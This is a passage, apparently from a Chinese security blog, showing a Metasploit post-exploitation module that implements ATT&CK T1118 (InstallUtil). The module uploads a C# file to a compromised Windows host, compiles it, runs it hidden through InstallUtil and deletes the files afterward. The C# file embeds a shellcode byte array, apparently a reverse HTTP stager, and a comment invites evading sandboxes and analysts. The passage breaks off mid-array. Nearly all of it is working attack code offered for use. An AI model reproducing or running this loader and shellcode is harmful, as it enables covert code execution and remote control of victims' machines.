class="keyword">def</span> <span class="title function_">clean_file</span></span><br><span class="line">        print_status(<span class="string">&quot;Removing files...&quot;</span>)</span><br><span class="line">        register_file_for_cleanup(datastore[<span class="string">&#x27;RFILE&#x27;</span>])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#运行cmd 命令</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">run_cmd</span>(<span class="params">user_cmd,io=<span class="literal">true</span></span>)</span><br><span class="line">      cmd = <span class="string">&quot;cmd /c <span class="subst">#&#123;user_cmd&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">begin</span></span><br><span class="line">        print_status(<span class="string">&quot;Executing &#x27;<span class="subst">#&#123;cmd&#125;</span>&#x27; on <span class="subst">#&#123;session.inspect&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> io</span><br><span class="line">          res = cmd_exec(cmd)</span><br><span class="line">          <span class="keyword">if</span> res</span><br><span class="line">            print_warning(res)</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          res = session.sys.process.execute(cmd, <span class="literal">nil</span>, &#123;<span class="string">&#x27;Hidden&#x27;</span> =&gt; <span class="literal">true</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">        print_error(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># secist</span></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># Windows</span></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># Post</span></span><br><span class="line"><span class="keyword">end</span> <span class="comment"># Msf</span></span><br></pre></td></tr></table></figure><p>模块文件 <strong>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;secist&#x2F;t1118.rb</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Post</span></span><br><span class="line">    <span class="keyword">include</span> Msf::Post::File</span><br><span class="line">    <span class="keyword">include</span> Exploit::FileDropper</span><br><span class="line">    <span class="keyword">include</span> Post::Windows::Secist</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">      <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">                        <span class="string">&#x27;Name&#x27;</span>          =&gt; <span class="string">&#x27;InstallUtil (T1118) Windows&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;Description&#x27;</span>   =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">                        ATT&amp;CK 模块编写 T1118  &#125;</span>,</span><br><span class="line">                        <span class="string">&#x27;License&#x27;</span>       =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">                        <span class="string">&#x27;Author&#x27;</span>        =&gt; [ <span class="string">&#x27;Secist-demon&#x27;</span> ],</span><br><span class="line">                        <span class="string">&#x27;References&#x27;</span>    =&gt; [ [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://attack.mitre.org/wiki/Technique/T1118&#x27;</span> ],</span><br><span class="line">                        [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1118&#x27;</span> ],</span><br><span class="line">                        [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260&#x27;</span>  ],</span><br><span class="line">                        [ <span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb&#x27;</span> ] ],</span><br><span class="line">                        <span class="string">&#x27;Platform&#x27;</span>      =&gt; [ <span class="string">&#x27;win&#x27;</span> ],</span><br><span class="line">                        <span class="string">&#x27;SessionTypes&#x27;</span>  =&gt; [ <span class="string">&#x27;meterpreter&#x27;</span> ]</span><br><span class="line">                       ))</span><br><span class="line">      register_options(</span><br><span class="line">      [</span><br><span class="line">        <span class="title class_">OptString</span>.new( <span class="string">&#x27;RFILE&#x27;</span>, [<span class="literal">false</span>, <span class="string">&#x27;上传到windows路径&#x27;</span>,<span class="string">&#x27;C:\\windows\\temp\\t1118.tmp&#x27;</span> ]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;LFILE&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;本地t1118.cs路径&#x27;</span>, <span class="symbol">:</span><span class="symbol">:File</span>.join(Msf::Config.install_root, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;secist&quot;</span>, <span class="string">&quot;t1118&quot;</span>, <span class="string">&quot;t1118.cs&quot;</span>) ]),</span><br><span class="line">        <span class="title class_">OptBool</span>.new(<span class="string">&#x27;CLEANUP_FILE&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&quot;清理文件&quot;</span>, <span class="literal">true</span>]),</span><br><span class="line">        <span class="title class_">OptString</span>.new(<span class="string">&#x27;DOTNET_VERSION&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;DotNet Version&#x27;</span>,<span class="string">&#x27;v4.0.30319&#x27;</span> ]),</span><br><span class="line">      ])</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span></span><br><span class="line">        <span class="keyword">begin</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">&quot;meterpreter&quot;</span></span><br><span class="line">            rfile = remote_file()</span><br><span class="line">            lfile = local_file()</span><br><span class="line">            dotnet_version = datastore[<span class="string">&#x27;DOTNET_VERSION&#x27;</span>]</span><br><span class="line">            base = <span class="string">&#x27;C:\Windows\Microsoft.NET\Framework&#x27;</span></span><br><span class="line">          </span><br><span class="line">            csc = base + <span class="string">&#x27;\\&#x27;</span> + dotnet_version + <span class="string">&#x27;\\&#x27;</span> + <span class="string">&#x27;csc.exe&#x27;</span></span><br><span class="line">            installutil = base + <span class="string">&#x27;\\&#x27;</span> + dotnet_version + <span class="string">&#x27;\\&#x27;</span> + <span class="string">&#x27;installutil.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">            upload_file(rfile, lfile)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;csc&#125;</span> /out:C:\\windows\\temp\\t1118.dll <span class="subst">#&#123;rfile&#125;</span>)</span></span><br><span class="line">            print_status(<span class="string">&quot;Compiling...&quot;</span>)</span><br><span class="line">            run_cmd(cmd)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            cmd = <span class="string">%Q(<span class="subst">#&#123;installutil&#125;</span> /logfile= /LogToConsole=false /U C:\\windows\\temp\\t1118.dll&quot;)</span></span><br><span class="line">            print_status(<span class="string">&quot;Executing InstallUtil...&quot;</span>)</span><br><span class="line">            run_cmd(cmd,<span class="literal">false</span>)</span><br><span class="line">            print_good(<span class="string">&quot;模块T1118执行成功&quot;</span>)</span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            clean_file()</span><br><span class="line">            print_good(<span class="string">&quot;清理缓存成功&quot;</span>)</span><br><span class="line">        <span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">            print_status(<span class="string">&quot;Unable to execute: <span class="subst">#&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">            print_error(<span class="string">&quot;模块T1118执行失败&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>T1118.cs</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Configuration.Install;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author: Casey Smith, Twitter: @subTee</span></span><br><span class="line"><span class="comment">License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">Step One:</span></span><br><span class="line"><span class="comment">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /out:exeshell.exe exeshell.cs</span></span><br><span class="line"><span class="comment">Step Two:</span></span><br><span class="line"><span class="comment">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe</span></span><br><span class="line"><span class="comment">See https://gist.github.comsubTee/0dc27475f141cc3a1b50 for details.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Exec</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Hello From Main...I Don&#x27;t Do Anything&quot;</span>);</span><br><span class="line"><span class="comment">//Add any behaviour here to throw off sandbox execution/analysts :)</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">System.ComponentModel.RunInstaller(true)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Sample</span> : <span class="title">System.Configuration.Install.Installer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_RELEASE = <span class="number">0x8000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Uninstall</span>(<span class="params">System.Collections.IDictionary savedState</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//ShellCode.DoEvil();</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">byte</span>[] buf = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">798</span>] &#123; <span class="number">0xfc</span>, <span class="number">0xe8</span>, <span class="number">0x89</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x64</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x30</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x0c</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0xe2</span>, <span class="number">0xf0</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x78</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x4a</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, <span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0xe3</span>, <span class="number">0x3c</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf4</span>, <span class="number">0x03</span>, <span class="number">0x7d</span>, <span class="number">0xf8</span>, <span class="number">0x3b</span>, <span class="number">0x7d</span>, <span class="number">0x24</span>, <span class="number">0x75</span>, <span class="number">0xe2</span>, <span class="number">0x58</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x24</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>, <span class="number">0x86</span>, <span class="number">0x5d</span>, <span class="number">0x68</span>, <span class="number">0x6e</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x69</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x3a</span>, <span class="number">0x56</span>, <span class="number">0x79</span>, <span class="number">0xa7</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xe9</span>, <span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x5b</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x51</span>, <span class="number">0x51</span>, <span class="number">0x6a</span>, <span class="number">0x03</span>, <span class="number">0x51</span>, <span class="number">0x51</span>, <span class="number">0x68</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x57</span>, <span class="number">0x89</span>, <span class="number">0x9f</span>, <span class="number">0xc6</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xeb</span>, <span class="number">0x70</span>, <span class="number">0x5b</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x52</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x40</span>, <span class="number">0x84</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0xeb</span>, <span class="number">0x55</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x89</span>, <span class="number">0xc6</span>, <span class="number">0x83</span>, <span class="number">0xc3</span>, <span class="number">0x50</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x6a</span>, <span class="number">0xff</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x06</span>, <span class="number">0x18</span>, <span class="number">0x7b</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0xc3</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xf6</span>, <span class="number">0x74</span>, <span class="number">0x04</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0xeb</span>, <span class="number">0x09</span>, <span class="number">0x68</span>, <span class="number">0xaa</span>, <span class="number">0xc5</span>, <span class="number">0xe2</span>, <span class="number">0x5d</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x68</span>, <span class="number">0x45</span>, <span class="number">0x21</span>, <span class="number">0x5e</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x57</span>, <span class="number">0x6a</span>, <span class="number">0x07</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0xb7</span>, <span class="number">0x57</span>, <span class="number">0xe0</span>, <span class="number">0x0b</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xbf</span>, <span class="number">0x00</span>, <span class="number">0x2f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0xc7</span>, <span class="number">0x74</span>, <span class="number">0xb7</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xe9</span>, <span class="number">0x91</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe9</span>, <span class="number">0xc9</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xe8</span>, <span class="number">0x8b</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x58</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0xf1</span>, <span class="number">0x72</span>, <span class="number">0x1c</span>, <span class="number">0xdc</span>, <span class="number">0x6a</span>, <span class="number">0x4a</span>, <span class="number">0x7d</span>, <span class="number">0x3b</span>, <span class="number">0x48</span>, <span class="number">0x25</span>, <span class="number">0xdd</span>, <span class="number">0xd0</span>, <span class="number">0x7d</span>, <span class="number">0xc5</span>, <span class="number">0x05</span>, <span class="number">0xed</span>, <span class="number">0xa2</span>, <span class="number">0x7d</span>, <span class="number">0x45</span>, <span class="number">0x28</span>, <span class="number">0x10</span>, <span class="number">0x9c</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0x4e</span>, <span class="number">0x60</span>, <span class="number">0x5b</span>, <span class="number">0xba</span>, <span class="number">0xa3</span>, <span class="number">0x59</span>, <span class="number">0x65</span>, <span class="number">0x6f</span>, <span class="number">0xc3</span>, <span class="number">0x23</span>, <span class="number">0x8a</span>, <span class="number">0x66</span>, <span class="number">0xe1</span>, <span class="number">0x0a</span>, <span class="number">0xa1</span>, <span class="number">0xb9</span>, <span class="number">0xc5</span>, <span class="number">0xba</span>, <span class="number">0xd9</span>, <span class="number">0xda</span>, <span class="number">0xb9</span>, <span class="number">0x3e</span>, <span class="number">0x44</span>, <span class="number">0xb2</span>, <span class="number">0x44</span>, <span class="number">0xf5</span>, <span class="number">0xac</span>, <span class="number">0x7b</span>, <span class="number">0x12</span>, <span class="number">0x7a</span>, <span class="number">0x72</span>, <span class="number">0xf0</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0xf1</span>, <span class="number">0x66</span>, <span class="number">0x46</span>, <span class="number">0xe8</span>, <span class="number">0x64</span>, <span class="number">0xe0</span>, <span class="number">0x95</span>, <span class="number">0xc5</span>, <span class="number">0x17</span>, <span class="number">0x2a</span>, <span class="number">0x8d</span>, <span class="number">0x85</span>, <span class="number">0xa1</span>, <span class="number">0xda</span>, <span class="number">0xfb</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x2d</span>, <span class="number">0x41</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x6e</span>, <span class="number">0x74</span>, <span class="number">0x3a</span>, <span class="number">0x20</span>, <span class="number">0x4d</span>, <span class="number">0x6f</span>, <span class="number">0x7a</span>, <span class="number">0x69</span>, <span class="number">0x6c</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x2f</span>, <span class="number">0x34</span>, <span class="number">0x2e</span>, <span class="number">0x30</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x63</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x62</span>, <span class="number">0x6c</span>, <span class="number">0x65</span>, <span class="number">0x3b</span>, <span class="number">0x20</span>, <span class="number">0x4d</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x20</span>, <span class="number">0x38</span>, <span class="number">0x2e</span>, <span class="number">0x30</span>, <span class="number">0x3b</span>, <span class="number">0x20</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x64</span>, <span class="number">0x6f</span>, <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x4e</span>, <span class="number">0x54</span>, <span class="number">0x20</span>, <span class="number">0x36</span>, <span class="number">0x2e</span>, <span class="number">0x31</span>, <span class="number">0x29</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0xbd</span>, <span class="number">0xd9</span>, <span class="number">0x1f</span>, <span class="number">0x5e</span>, <span class="number">0xec</span>, <span class="number">0x46</span>, <span class="number">0x7a</span>, <span class="number">0xf0</span>, <span class="number">0x58</span>, <span class="number">0x92</span>, <span class="number">0x00</span>, <span class="number">0x87</span>, <span class="number">0x53</span>, <span class="number">0x08</span>, <span class="number">0xb0</span>, <span class="number">0xc5</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0xc6</span>, <span class="number">0x8a</span>, <span class="number">0xde</span>, <span class="number">0x7e</span>, <span class="number">0xac</span>, <span class="number">0x96</span>, <span class="number">0xa4</span>, <span class="number">0x3d</span>, <span class="number">0x95</span>, <span class="number">0x9a</span>, <span class="number">0x3c</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x93</span>, <span class="number">0x8a</span>, <span class="number">0x64</span>, <span class="number">0x3f</span>, <span class="number">0x06</span>, <span class="number">0x48</span>, <span class="number">0x7e</span>, <span class="number">0xe5</span>, <span class="number">0xe5</span>, <span class="number">0x5f</span>, <span class="number">0x68</span>, <span class="number">0x40</span>, <span class="number">0xd9</span>, <span class="number">0x67</span>, <span class="number">0x04</span>, <span class="number">0x95</span>, <span class="number">0x6c</span>, <span class="number">0x1b</span>, <span class="number">0x1f</span>, <span class="number">0x25</span>, <span class="number">0xee</span>, <span class="number">0xdc</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0xe0</span>, <span class="number">0xca</span>, <span class="number">0xce</span>, <span class="number">0xd6</span>, <span class="number">0x5e</span>, <span class="number">0x7b</span>, <span class="number">0xd7</span>, <span class="number">0xe4</span>, <span class="number">0xc9</span>, <span class="number">0x0a</span>, <span class="number">0xde</span>, <span class="number">0xc0</span>, <span class="number">0x9c</span>, <span class="number">0xa6</span>, <span class="number">0xb5</span>, <span class="number">0xbc</span>, <span class="number">0x06</span>, 